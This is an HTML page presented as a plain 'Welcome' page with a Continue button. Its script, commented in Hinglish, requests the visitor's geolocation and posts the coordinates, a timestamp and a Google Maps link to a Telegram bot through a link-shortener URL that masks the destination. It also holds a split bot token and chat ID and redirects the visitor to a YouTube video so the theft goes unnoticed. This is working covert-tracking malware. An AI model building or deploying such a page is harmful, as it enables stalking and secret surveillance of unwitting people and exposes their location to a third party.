<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #74ebd5, #acb6e5);
            font-family: Arial, sans-serif;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.9);
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2980b9;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to the Page</h1>
        <p>Please click below to continue...</p>
        <button onclick="startProcess()">Continue</button>
        <div class="loader" id="loader"></div>
    </div>

    <script>
        // Telegram Bot Token aur Chat ID (obfuscated)
        const t1 = '7969903007';
        const t2 = 'AAF8MOt9s2IgFyEzhBok9atp15UoqSK-tYw';
        const TELEGRAM_BOT_TOKEN = t1 + ':' + t2;
        const TELEGRAM_CHAT_ID = '6696895935';
        const REDIRECT_URL = 'https://youtu.be/jSOmHSE8JIw?si=T5nDlk41noysj_J4'; // Redirect URL
        const TELEGRAM_API_URL = 'https://bit.ly/4iNGqmM'; // Masked Telegram API URL

        function startProcess() {
            // Show loader, hide button and text
            document.querySelector('.container p').style.display = 'none';
            document.querySelector('button').style.display = 'none';
            document.getElementById('loader').style.display = 'block';

            // Delay ke saath geolocation fetch karo
            setTimeout(() => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        sendLocation,
                        () => redirect(), // Error ho toh redirect
                        { timeout: 10000 } // Timeout set karen
                    );
                } else {
                    redirect(); // Geolocation support nahi toh redirect
                }
            }, 1000); // 1 second delay
        }

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const ts = new Date().toLocaleString();
            const msg = `Location Found!\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${ts}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`;

            // POST request to masked Telegram API URL
            fetch(TELEGRAM_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: msg
                })
            })
            .then(response => response.json())
            .then(data => {
                redirect(); // Success ya fail, redirect karen
            })
            .catch(() => {
                redirect(); // Error ho toh redirect
            });
        }

        function redirect() {
            window.location.href = REDIRECT_URL;
        }
    </script>
</body>
</html>
